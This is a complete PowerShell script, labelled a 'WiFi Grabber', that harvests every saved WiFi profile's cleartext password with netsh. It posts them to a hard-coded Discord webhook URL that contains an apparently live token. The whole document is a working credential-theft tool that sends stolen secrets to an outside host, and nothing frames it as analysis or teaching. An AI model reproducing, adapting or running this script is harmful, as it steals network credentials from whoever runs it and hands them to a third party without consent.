# WiFi Grabber Script - Sends WiFi credentials to Discord Webhook

try {
    # Step 1: Collect saved WiFi profiles
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }

    # Initialize variable to store WiFi credentials
    $wifiCreds = ""

    # Step 2: Loop through each profile and extract the password (if available)
    foreach ($profile in $wifiProfiles) {
        $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
        $wifiCreds += "`nProfile: $profile`n$details`n"
    }

    # Step 3: Prepare Discord Webhook URL (replace with your own)
    $webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"

    # Step 4: Prepare JSON payload to send to Discord
    $body = @{
        content = "WiFi Credentials Grabbed:`n```$wifiCreds```"
    } | ConvertTo-Json -Depth 10

    # Step 5: Send the credentials to Discord using the webhook
    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'

} catch {
    # Step 6: Handle any errors and log them to a local file
    "Error: $_" | Out-File C:\temp\wifi_grabber_error.log -Append
}
